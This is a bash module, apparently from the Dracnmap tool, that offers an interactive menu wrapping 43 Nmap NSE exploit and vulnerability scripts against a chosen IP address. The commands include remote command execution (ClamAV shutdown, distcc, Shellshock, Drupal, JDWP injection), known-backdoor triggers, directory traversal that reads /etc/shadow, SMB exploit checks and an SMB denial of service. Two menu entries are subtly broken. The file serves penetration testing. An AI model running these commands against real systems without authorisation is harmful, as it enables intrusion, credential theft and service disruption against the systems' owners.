#!/usr/bin/env bash

# ``````````````````````````````````````````````````````````````````````````````
# Function name: _init_cli_exploit()
#
# Description:
#   Starting the Dracnmap Exploit module.
#
# Usage:
#   _init_cli_exploit
#
# Examples:
#   _init_cli_exploit
#

function _init_cli_exploit() {

  local _FUNCTION_ID="_init_cli_exploit"
  local _STATE=0

  input_array=()

  while [ "${input_array[0]}" != "back" ] ; do

    cstate="1"

    __cli_banner="nse-exploit"

    printf "\e[1;31m%s\e[m " "${__cli_prompt}${__cli_banner}>" && read -ra input_array

    case ${input_array[0]} in

      01|1)

        _init_cmd "$xterm -sV --script=afp-path-vuln $_ipaddr"

        cstate=1
        ;;

      02|2)

        _init_cmd "$xterm --script clamav-exec --script-args cmd='shutdown' $_ipaddr"

        cstate=1
        ;;

      03|3)

        _init_cmd "$xterm -p 3632 --script distcc-exec --script-args="distcc-exec.cmd='id'" $_ipaddr"

        cstate=1
        ;;

      04|4)

        _init_cmd "$xterm -p 21 --script ftp-proftpd-backdoor $_ipaddr"

        cstate=1
        ;;

      05|5)

        _init_cmd "$xterm -p 21 --script ftp-vsftpd-backdoor $_ipaddr"

        cstate=1
        ;;

      06|6)

        _init_cmd "$xterm -p 80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $_ipaddr"

        cstate=1
        ;;

      07|7)

        _init_cmd "$xterm -sV --script http-avaya-ipoffice-users $_ipaddr"

        cstate=1
        ;;

      08|8)

        _init_cmd "$xterm -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' $_ipaddr"

        cstate=1
        ;;

      09|9)

        _init_cmd "$xterm -p 80 --script http-axis2-dir-traversal $_ipaddr"

        cstate=1
        ;;

      10)

        _init_cmd "$xterm -p $_port --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 $_ipaddr"

        cstate=1
        ;;

      11)

        _init_cmd "$xterm -p 80 --script http-coldfusion-subzero --script-args basepath=/cf/ $_ipaddr"

        cstate=1
        ;;

      12)

        _init_cmd "$xterm -p 80 --script http-csrf.nse $_ipaddr"

        cstate=1
        ;;

      13)

        _init_cmd "$xterm -sV --script http-dlink-backdoor $_ipaddr"

        cstate=1
        ;;

      14)

        _init_cmd "$xterm -p 80 --script http-dombased-xss.nse $_ipaddr"

        cstate=1
        ;;

      15)

        _init_cmd "$xterm -p 80 --script http-fileupload-exploiter.nse $_ipaddr"

        cstate=1
        ;;

      16)

        _init_cmd "$xterm -p 80 --script http-huawei-hg5xx-vuln $_ipaddr"

        cstate=1
        ;;

      17)

        _init_cmd "$xterm -p 80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $_ipaddr"

        cstate=1
        ;;

      18)

        _init_cmd "$xterm -p 80 --script http-majordomo2-dir-traversal $_ipaddr"

        cstate=1
        ;;

      19)

        _init_cmd "$xterm -p 80 --script http-phpmyadmin-dir-traversal $_ipaddr"

        cstate=1
        ;;

      20)

        _init_cmd "$xterm -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $_ipaddr"

        cstate=1
        ;;

      21)

        _init_cmd "$xterm -p 80 --script http-stored-xss.nse $_ipaddr"

        cstate=1
        ;;

      22)

        _init_cmd "$xterm -p 80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn $_ipaddr"

        cstate=1
        ;;

      23)

        _init_cmd "$xterm -p 80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow $_ipaddr"

        cstate=1
        ;;

      24)

        _init_cmd "$xterm --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" $_ipaddr"

        cstate=1
        ;;

      25)

        _init_cmd "$xterm -sV --script http-vuln-cve2012-1823 $_ipaddr"

        cstate=1
        ;;

      26)

        _init_cmd "$xterm -sV --script http-vuln-cve2013-0156 $_ipaddr"

        cstate=1
        ;;

      27)

        _init_cmd "$xterm -sV http-rompager-xss $_ipaddr"

        cstate=1
        ;;

      28)

        _init_cmd "$xterm -p 80 --script http-vuln-cve2013-7091 --script-args http-vuln-cve2013-7091=/ZimBra $_ipaddr"

        cstate=1
        ;;

      29)

        _init_cmd "$xterm --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $_ipaddr"

        cstate=1
        ;;

      30)

        _init_cmd "$xterm --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress""

        cstate=1
        ;;

      31)

        _init_cmd "$xterm -sV -p 80 --script http-vuln-wnr1000-creds $_ipaddr"

        cstate=1
        ;;

      32)

        _init_cmd "$xterm -sV --script=irc-unrealircd-backdoor $_ipaddr"

        cstate=1
        ;;

      33)

        _init_cmd "$xterm -sT -p $_port --script=+jdwp-exec --script-args cmd="date" $_ipaddr"

        cstate=1
        ;;

      34)

        _init_cmd "$xterm -sT -p $_port --script=+jdwp-inject --script-args filename=HelloWorld.class $_ipaddr"

        cstate=1
        ;;

      35)

        echo -ne $okegreen "Hostname to resolve: " ; tput sgr0
        read _hostname

        _init_cmd "$xterm -p $_port --script qconn-exec --script-args qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" $_ipaddr"

        cstate=1
        ;;

      36)

        _init_cmd "$xterm -p 445 --script smb-vuln-conficker.nse $_ipaddr"

        cstate=1
        ;;

      37)

        _init_cmd "$xterm -p 445 --script smb-vuln-cve2009-3103.nse $_ipaddr"

        cstate=1
        ;;

      38)

        _init_cmd "$xterm -p 445 --script smb-vuln-ms06-025.nse $_ipaddr"

        cstate=1
        ;;

      39)

        _init_cmd "$xterm -p 445 --script smb-vuln-ms07-029.nse $_ipaddr"

        cstate=1
        ;;

      40)

        _init_cmd "$xterm -p 445 --script smb-vuln-ms08-067.nse $_ipaddr"

        cstate=1
        ;;

      41)

        _init_cmd "$xterm -p 445 --script smb-vuln-regsvc-dos.nse $_ipaddr"

        cstate=1
        ;;

      42)

        _init_cmd "$xterm -pT:25,465,587 --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" $_ipaddr"

        cstate=1
        ;;

      43)

        _init_cmd "$xterm -p 49152 --script supermicro-ipmi-conf $_ipaddr"

        cstate=1
        ;;

      help)

        _help_
        cstate="0" ;;

      show)

        if [ ${input_array[1]} ] ; then

          case ${input_array[1]} in

            session)

              show_session
              ;;

            *)
              printf "stdout: %s\n" "unknown command" ;;

          esac

        else

          printf "stdout: %s\n" "unknown argument"

        fi
        cstate="0" ;;

      set)

        if [ ${input_array[1]} ] ; then

          case ${input_array[1]} in

            session)

              if [ ${input_array[2]} ] ; then

                set_session "${input_array[2]}"

              else

                printf "stdout: %s\n" "invalid session params"

              fi
              ;;

            *)
              printf "stdout: %s\n" "unknown command" ;;

          esac

        else

          printf "stdout: %s\n" "unknown argument"

        fi
        cstate="0" ;;

      clear)

        menu_exploit
        _init_cli_exploit
        cstate="0" ;;

      back)

        menu_nse
        _init_cli_nse
        cstate="0" ;;

      main)

        menu
        _init_cli
        cstate="0" ;;

      nmap)

        _init_cmd "nmap ${input_array[@]:1}"
        cstate="0" ;;

      exit)
        _exit_ 0 ;;
      "")
        echo -en ""
        cstate="0" ;;
      *)

        if [ "$cstate" -eq "1" ] ; then

          printf "stdout: unknown command\n"

        fi

      ;;

    esac

  done

  return $_STATE

}

# Author of changes: trimstray (contact@nslab.at, https://github.com/trimstray)
#   - removed blank spaces/tabs
#   - correcting indentation (transparent code)
#   - replaced 'test' to '[[ ]]'
#   - changed comparison operator (-eq)
#   - protection against giving an illegal value
function menu_exploit() {

  clear
  echo
  echo

  echo -e $white"     ID                    DESCRIPTION"
  echo -e $white"    ---------------------------------------------------------"
  echo -e $white"    [$okegreen"01"$white]$cyan afp-path-vuln"
  echo -e $white"    [$okegreen"02"$white]$cyan clamav-exec"
  echo -e $white"    [$okegreen"03"$white]$cyan distcc-cve2004-2687"
  echo -e $white"    [$okegreen"04"$white]$cyan ftp-proftpd-backdoor"
  echo -e $white"    [$okegreen"05"$white]$cyan ftp-vsftpd-backdoor"
  echo -e $white"    [$okegreen"06"$white]$cyan http-adobe-coldfusion-apsa1301"
  echo -e $white"    [$okegreen"07"$white]$cyan http-avaya-ipoffice-users"
  echo -e $white"    [$okegreen"08"$white]$cyan http-awstatstotals-exec"
  echo -e $white"    [$okegreen"09"$white]$cyan http-axis2-dir-traversal"
  echo -e $white"    [$okegreen"10"$white]$cyan http-barracuda-dir-traversal"
  echo -e $white"    [$okegreen"11"$white]$cyan http-coldfusion-subzero"
  echo -e $white"    [$okegreen"12"$white]$cyan http-csrf"
  echo -e $white"    [$okegreen"13"$white]$cyan http-dlink-backdoor"
  echo -e $white"    [$okegreen"14"$white]$cyan http-dombased-xss"
  echo -e $white"    [$okegreen"15"$white]$cyan http-fileupload-exploiter"
  echo -e $white"    [$okegreen"16"$white]$cyan http-huawei-hg5xx-vuln"
  echo -e $white"    [$okegreen"17"$white]$cyan http-litespeed-sourcecode-download"
  echo -e $white"    [$okegreen"18"$white]$cyan http-majordomo2-dir-traversal"
  echo -e $white"    [$okegreen"19"$white]$cyan http-phpmyadmin-dir-traversal"
  echo -e $white"    [$okegreen"20"$white]$cyan http-shellshock"
  echo -e $white"    [$okegreen"21"$white]$cyan http-stored-xss"
  echo -e $white"    [$okegreen"22"$white]$cyan http-tplink-dir-traversal"
  echo -e $white"    [$okegreen"23"$white]$cyan http-vuln-cve2006-3392"
  echo -e $white"    [$okegreen"24"$white]$cyan http-vuln-cve2009-3960"
  echo -e $white"    [$okegreen"25"$white]$cyan http-vuln-cve2012-1823"
  echo -e $white"    [$okegreen"26"$white]$cyan http-vuln-cve2013-0156"
  echo -e $white"    [$okegreen"27"$white]$cyan http-vuln-cve2013-6786"
  echo -e $white"    [$okegreen"28"$white]$cyan http-vuln-cve2013-7091"
  echo -e $white"    [$okegreen"29"$white]$cyan http-vuln-cve2014-3704"
  echo -e $white"    [$okegreen"30"$white]$cyan http-vuln-cve2014-8877"
  echo -e $white"    [$okegreen"31"$white]$cyan http-vuln-wnr1000-creds"
  echo -e $white"    [$okegreen"32"$white]$cyan irc-unrealircd-backdoor"
  echo -e $white"    [$okegreen"33"$white]$cyan jdwp-exec"
  echo -e $white"    [$okegreen"34"$white]$cyan jdwp-inject"
  echo -e $white"    [$okegreen"35"$white]$cyan qconn-exec"
  echo -e $white"    [$okegreen"36"$white]$cyan smb-vuln-conficker"
  echo -e $white"    [$okegreen"37"$white]$cyan smb-vuln-cve2009-3103"
  echo -e $white"    [$okegreen"38"$white]$cyan smb-vuln-ms06-025"
  echo -e $white"    [$okegreen"39"$white]$cyan smb-vuln-ms07-029"
  echo -e $white"    [$okegreen"40"$white]$cyan smb-vuln-ms08-067"
  echo -e $white"    [$okegreen"41"$white]$cyan smb-vuln-regsvc-dos"
  echo -e $white"    [$okegreen"42"$white]$cyan smtp-vuln-cve2010-4344"
  echo -e $white"    [$okegreen"43"$white]$cyan supermicro-ipmi-conf"
  echo -e " "

}
